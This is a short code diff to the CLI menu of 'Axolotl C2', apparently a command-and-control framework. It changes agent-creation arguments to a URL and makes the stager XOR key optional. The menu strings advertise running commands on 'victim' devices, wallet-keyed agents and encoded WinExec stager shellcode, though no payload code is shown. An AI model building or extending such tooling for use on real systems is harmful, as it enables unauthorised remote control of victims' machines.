@@ -48,7 +48,7 @@ def manageAgents(command, args, menuList):
         updateAgentsList()
         listAgents()
     elif command == "create":
-        if len(args) < 6:
+        if len(args) < 5:
             print("\t Arguments missing.\n")
         else:
             generateAgent(args)
@@ -142,13 +142,13 @@ def initCLI():
     AgentMenu = Menu("Agents")
     AgentMenu.registerCmd("shell", "Execute command on victim device.", "<agent_name> <command>")
     AgentMenu.registerCmd("list", "list agents.", "")
-    AgentMenu.registerCmd("create", "Create python agent.", "<name> <ip> <port> <wallet_addr> <key> <save_path>")
+    AgentMenu.registerCmd("create", "Create python agent.", "<name> <url> <wallet_addr> <key> <save_path>")
     AgentMenu.registerCmd("home", "Return to main menu.", "")
     AgentMenu.registerCmd("help", "Show help.", "")
     AgentMenu.registerCmd("exit", "Quit Axolotl C2.", "")
     AgentMenu.registerCmd("result", "Show result of the task.", "<agent>")
     StagerMenu = Menu("Stager")
-    StagerMenu.registerCmd("generate-stager", "Generate a stager shellcode that use WinExec.", "<command> <encode|python|nim|c#|xor> <xor_key>")
+    StagerMenu.registerCmd("generate-stager", "Generate a stager shellcode that use WinExec.", "<command> <encode|python|nim|c#|xor> opt:<xor_key>")
     StagerMenu.registerCmd("start", "Start a stager listener.", "<ip> <port> opt:<custom_agent_path>")
     StagerMenu.registerCmd("stop", "Stop the stager listener.", "<ip>")
     StagerMenu.registerCmd("list", "List stager listener.", "")
